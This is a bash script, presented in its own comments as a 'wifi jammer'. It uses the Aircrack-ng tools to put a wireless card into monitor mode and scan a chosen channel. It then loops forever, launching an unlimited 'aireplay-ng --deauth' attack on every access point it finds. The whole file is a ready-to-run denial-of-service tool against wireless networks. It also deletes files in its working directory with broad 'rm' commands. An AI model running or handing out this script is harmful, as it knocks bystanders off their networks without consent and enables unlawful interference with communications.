#!/bin/bash
# This is a bash based wifi jammer. It uses your wifi card
# to continuously send de-authenticate packets to every client
# on a specified channel... at lest thats what its suppose to do.
# This program needs the Aircrack-ng suit to function
# - and a wifi card that works with aircrack.
# Checks if this file is being ran as root.
if [ x"`which id 2> /dev/null`" != "x" ]
then
	USERID="`id -u 2> /dev/null`"
fi
if [ x$USERID = "x" -a x$UID != "x" ]
then
	USERID=$UID
fi
if [ x$USERID != "x" -a x$USERID != "x0" ]
then
	#Guess not
	echo Run it as root ; exit ;
fi
# Changes working directory to the same as this file
DIR="$( cd "$( dirname "$0" )" && pwd )"
cd $DIR
# Sets first command line VAR
WIFIVAR="$1"
#Checks if user specified a WIFI card
if [ x"$WIFIVAR" = x"" ]
then
	echo "No wifi card specified, scanning for available cards (doesnt always work)"
	USWC="no"
else
	echo "Using user specified wifi card ""$WIFIVAR"
	USWC="yes"
fi
if [ x"$USWC" = x"no" ]
then
# Uses Airmon-ng to scan for available wifi cards.
airmon-ng|cut -b 1,2,3,4,5,6,7 > clist01
count=0
if [ -e "clist" ]; then
rm clist
fi
cat clist01 |while read LINE ; do
	if [ $count -gt 3 ];then 
		echo "$LINE" | cut -b 1-7 | tr -d [:space:] >>clist
		count=$((count+1))
	else
		count=$((count+1))
	fi
done
rm clist01
WIFI=`cat clist`
echo "Using first available Wifi card: `airmon-ng|grep "$WIFI"`"
echo "If you would like to specify your own card please do so at the command line"
echo "etc: sudo ./wifijammer_0.1 eth0"
rm clist
else
WIFI="$WIFIVAR"
fi
#Check for a wifi card
if [ x"$WIFI" = x"" ]; then
	#Guess no wifi card was detected
	echo "No wifi card detected. Quitting" 
	exit
fi
#Start the wireless interface in monitor mode
if [ x"$airmoncard" != x"1" ]; then
	airmon-ng start $WIFI >tempairmonoutput
	airmoncard="1"
fi
#Looks for wifi card thats been set in Monitor mode
if [ x"$testcommandvar02" = x"" ];then
	WIFI02=`cat tempairmonoutput|grep "monitor mode enabled on" |cut -b 30-40 | tr -d [:space:] |tr -d ")"`
	if [ x$WIFI02 = x ];then
		WIFI02=`cat tempairmonoutput|grep "monitor mode enabled" |cut -b 1-5 | tr -d [:space:]`
	fi
	WIFI="$WIFI02"
	rm tempairmonoutput
fi
echo "$WIFI"
# Asks user to specify a channel to jam, or to see a 40 second scan of the area
read -p "Please specify a channel to jam, or type in 'scan' (without quotes) to see airodump's output for 40 seconds:" NUMBER
# If something was entered that was not "scan" then assume its a number and continue
if [ x"$NUMBER" != x"scan" ];then
	CHANNEL="$NUMBER"
else
# scan was entered, so start airodump-ng in channel hopping mode to scan the area
	airodump-ng $WIFI &
	SCANPID=$!
	sleep 40s
	kill $SCANPID
	sleep 1s
# Asks user to specify a channel
	read -p "Please specify a channel to jam:" NUMBER
	CHANNEL="$NUMBER"
fi
# Launches airodump-ng on specified channel to start gathering a client list
rm *.csv
xterm -fn fixed -geom -0-0 -title "Scanning specified channel" -e "airodump-ng -c $NUMBER -w airodumpoutput $WIFI" 2>/dev/null &
# Removes temp files that are no longer needed
rm *.cap 2>/dev/null
rm *.kismet.csv 2>/dev/null
rm *.netxml 2>/dev/null
# Makes a folder that will be needed later
mkdir stationlist 2>/dev/null
rm stationlist/*.txt
# Start a loop so new clients can be added to the jamming list
while [ x1 ];do
sleep 5s
# Takes appart the list of clients and reorganizes it in to something useful
	cat airodumpoutput*.csv|while read LINE01 ; do
		echo "$LINE01" > tempLINE01
		LINE=`echo $LINE01|cut -f 1 -d ,|tr -d [:space:]`
		rm tempLINE01
# Ignores any blank 
		if [ x"$LINE" != x"" ];then
			if [ x"$LINE" = x"StationMAC" ];then
				start="no"
			fi
			if [ x"$start" = x"yes" ];then
				if [ -e stationlist/"$LINE".txt ];then
					echo "" 2>/dev/null
				else
# Lauches new window with de-authenticate thingy doing it's thing
					xterm -fn fixed -geom -0-0 -title "Jamming $LINE" -e "aireplay-ng --deauth 0 -a $LINE $WIFI" &
					echo "$LINE" > stationlist/$LINE.txt
				fi
			fi
			if [ x"$LINE" = x"BSSID" ];then
				start="yes"
			fi
		fi
	done
done
